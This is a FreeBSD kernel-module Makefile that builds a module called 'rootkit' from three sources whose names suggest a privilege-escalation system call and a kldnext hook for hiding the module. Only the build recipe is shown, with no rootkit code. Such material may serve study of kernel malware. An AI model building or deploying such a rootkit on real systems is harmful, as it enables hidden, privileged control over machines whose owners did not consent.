KMOD = rootkit
SRCS = rootkit.c elevate_syscall.c kldnext_hook.c

.include <bsd.kmod.mk>
